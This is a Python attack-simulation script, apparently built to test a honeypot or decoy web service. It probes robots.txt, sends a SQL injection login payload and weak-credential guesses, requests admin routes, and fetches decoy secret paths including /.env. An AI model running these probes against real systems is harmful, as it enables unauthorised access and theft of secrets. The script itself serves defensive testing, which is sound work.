"""
Web Attack Scenario (Member 2).
Performs Web Directory Crawling -> Credential Stuffing -> Admin Bypass -> Decoy Harvesting.
"""

import time
import httpx
from typing import Dict, Any, List
from rich.console import Console
from rich.panel import Panel

from attacker_simulator.scenarios.base import BaseScenario

console = Console(legacy_windows=False)


class WebAttackScenario(BaseScenario):
    """
    Simulates a web application reconnaissance, brute force, and sensitive file exfiltration attack.
    """
    def __init__(self, target_host: str, web_port: int = 8080, delay: float = 0.3):
        super().__init__(target_host=target_host, web_port=web_port, delay=delay)
        self.base_url = f"http://{target_host}:{web_port}"

    def run(self) -> Dict[str, Any]:
        console.print(Panel(
            f"[bold magenta]Scenario: Web Reconnaissance, Brute Force & Decoy Traps[/bold magenta]\n"
            f"Target: [cyan]{self.base_url}[/cyan]",
            title="[bold yellow]MEMBER 2 ATTACK VECTOR[/bold yellow]",
            expand=False
        ))

        self.stats["start_time"] = time.time()
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Parrot OS; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }

        with httpx.Client(base_url=self.base_url, headers=headers, timeout=5.0) as client:
            
            # Step 1: Reconnaissance (robots.txt, security headers)
            console.print("[bold yellow][*] Phase 1: Probing web metadata and /robots.txt...[/bold yellow]")
            self.stats["probes_sent"] += 1
            try:
                r = client.get("/robots.txt")
                self.stats["success_responses"] += 1
                console.print(f"  [green][+] GET /robots.txt -> HTTP {r.status_code}[/green]")
                console.print(f"    [dim]Discovered Disallow Rules: {len(r.text.splitlines())} paths[/dim]")
            except Exception as e:
                self.stats["error_responses"] += 1
                console.print(f"  [red][!] Failed /robots.txt: {e}[/red]")
            self.sleep()

            # Step 2: Login Brute Force / SQL Injection Probing
            console.print("\n[bold yellow][*] Phase 2: Launching Credential Stuffing & SQLi on /login...[/bold yellow]")
            login_payloads = [
                ("admin' OR '1'='1", "password123", "SQL Injection Probe"),
                ("test_user", "123456", "Weak Credential Probe"),
                ("devops@corp.internal", "devops2026", "Corporate Email Probe"),
                ("admin", "superadminpassword", "Administrative Login Attempt"),
            ]

            for user, pwd, probe_type in login_payloads:
                self.stats["probes_sent"] += 1
                try:
                    console.print(f"  [cyan]› {probe_type}: [/cyan][white]{user}:{pwd}[/white]")
                    r = client.post("/login", data={"username": user, "password": pwd}, follow_redirects=True)
                    self.stats["success_responses"] += 1
                    console.print(f"    [dim]Result: HTTP {r.status_code} (Final URL: {r.url.path})[/dim]")
                except Exception as e:
                    self.stats["error_responses"] += 1
                self.sleep()

            # Step 3: Admin Console & Dashboard Probing
            console.print("\n[bold yellow][*] Phase 3: Accessing Administrative Dashboards...[/bold yellow]")
            admin_routes = ["/admin", "/dashboard"]
            for route in admin_routes:
                self.stats["probes_sent"] += 1
                self.stats["decoys_triggered"] += 1
                try:
                    r = client.get(route)
                    self.stats["success_responses"] += 1
                    console.print(f"  [bold red]⚡ [ALERT TRIGGER] Probing high-privilege route {route} -> HTTP {r.status_code}[/bold red]")
                except Exception as e:
                    self.stats["error_responses"] += 1
                self.sleep()

            # Step 4: Sensitive File & Decoy Harvesting
            console.print("\n[bold yellow][*] Phase 4: Harvesting Synthetic Decoys & Exposed Secrets...[/bold yellow]")
            decoys = [
                ("/fake-config", "Production Environment Configuration & DB secrets"),
                ("/fake-users", "Employee Directory & Password Hashes"),
                ("/fake-backup", "PostgreSQL Database Backup Dump"),
                ("/fake-credentials", "Root SSH & AWS Access Keys"),
                ("/.env", "Environment Variables File"),
            ]

            for path, desc in decoys:
                self.stats["probes_sent"] += 1
                self.stats["decoys_triggered"] += 1
                try:
                    r = client.get(path)
                    self.stats["success_responses"] += 1
                    snippet = r.text[:60].replace("\n", " ")
                    console.print(f"  [bold red]⚡ [DECOY HIT] {path} ({desc}) -> HTTP {r.status_code}[/bold red]")
                    console.print(f"    [dim]Payload sample: {snippet}...[/dim]")
                except Exception as e:
                    self.stats["error_responses"] += 1
                self.sleep()

        self.stats["end_time"] = time.time()
        console.print("\n[bold green][+] Web attack scenario concluded successfully![/bold green]")
        return self.stats
